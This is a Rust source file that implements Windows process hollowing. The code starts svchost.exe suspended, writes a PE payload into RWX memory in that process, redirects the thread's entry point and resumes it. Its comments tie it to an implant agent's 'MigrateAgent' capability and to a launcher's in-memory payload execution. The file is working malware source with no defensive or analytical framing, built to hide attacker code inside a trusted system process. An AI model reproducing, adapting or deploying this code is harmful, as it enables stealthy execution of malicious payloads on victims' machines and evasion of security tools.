//! Windows process-hollowing primitive.
//!
//! Spawns `C:\Windows\System32\svchost.exe` suspended, allocates RWX memory
//! in the child, copies a PE payload into it, redirects the entry-point in
//! the thread context, and resumes execution. Used for both the agent's
//! `MigrateAgent` capability and the launcher's in-memory payload execution.

use anyhow::{anyhow, Result};
use std::ffi::OsStr;
use std::mem::{size_of, zeroed};
use std::os::windows::ffi::OsStrExt;
use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
use winapi::um::processthreadsapi::{
    CreateProcessW, ResumeThread, PROCESS_INFORMATION, STARTUPINFOW,
};
use winapi::um::winbase::{CREATE_SUSPENDED, DETACHED_PROCESS};
use winapi::um::winnt::{
    CONTEXT, CONTEXT_FULL, IMAGE_DOS_HEADER, IMAGE_NT_HEADERS, MEM_COMMIT, MEM_RESERVE,
    PAGE_EXECUTE_READWRITE,
};
use winapi::um::wow64apiset::{GetThreadContext, SetThreadContext};

/// Spawn a host process suspended and run `payload` in its address space.
pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
    if payload.len() < size_of::<IMAGE_DOS_HEADER>() {
        return Err(anyhow!("payload too small to contain DOS header"));
    }

    let mut si: STARTUPINFOW = unsafe { zeroed() };
    si.cb = size_of::<STARTUPINFOW>() as u32;
    let mut pi: PROCESS_INFORMATION = unsafe { zeroed() };

    let cmd: Vec<u16> = OsStr::new("C:\\Windows\\System32\\svchost.exe")
        .encode_wide()
        .chain(std::iter::once(0))
        .collect();

    let ok = unsafe {
        CreateProcessW(
            std::ptr::null(),
            cmd.as_ptr() as *mut _,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0,
            CREATE_SUSPENDED | DETACHED_PROCESS,
            std::ptr::null_mut(),
            std::ptr::null(),
            &mut si,
            &mut pi,
        )
    };
    if ok == 0 {
        return Err(anyhow!("CreateProcessW failed"));
    }

    let image_base = unsafe {
        VirtualAllocEx(
            pi.hProcess,
            std::ptr::null_mut(),
            payload.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    };
    if image_base.is_null() {
        return Err(anyhow!("VirtualAllocEx failed"));
    }

    let mut written: usize = 0;
    let ok = unsafe {
        WriteProcessMemory(
            pi.hProcess,
            image_base,
            payload.as_ptr() as *const _,
            payload.len(),
            &mut written,
        )
    };
    if ok == 0 {
        return Err(anyhow!("WriteProcessMemory failed"));
    }

    let dos: &IMAGE_DOS_HEADER = unsafe { &*(payload.as_ptr() as *const IMAGE_DOS_HEADER) };
    let nt_offset = dos.e_lfanew as usize;
    if nt_offset + size_of::<IMAGE_NT_HEADERS>() > payload.len() {
        return Err(anyhow!("payload truncated before NT headers"));
    }
    let nt: &IMAGE_NT_HEADERS =
        unsafe { &*((payload.as_ptr() as usize + nt_offset) as *const IMAGE_NT_HEADERS) };
    let entry_point = image_base as usize + nt.OptionalHeader.AddressOfEntryPoint as usize;

    let mut ctx: CONTEXT = unsafe { zeroed() };
    ctx.ContextFlags = CONTEXT_FULL;
    if unsafe { GetThreadContext(pi.hThread, &mut ctx) } == 0 {
        return Err(anyhow!("GetThreadContext failed"));
    }
    #[cfg(target_arch = "x86_64")]
    {
        ctx.Rcx = entry_point as u64;
    }
    #[cfg(target_arch = "x86")]
    {
        ctx.Eax = entry_point as u32;
    }
    if unsafe { SetThreadContext(pi.hThread, &ctx) } == 0 {
        return Err(anyhow!("SetThreadContext failed"));
    }
    if unsafe { ResumeThread(pi.hThread) } == u32::MAX {
        return Err(anyhow!("ResumeThread failed"));
    }
    tracing::info!(pid = pi.dwProcessId, "hollowed payload running");
    Ok(())
}
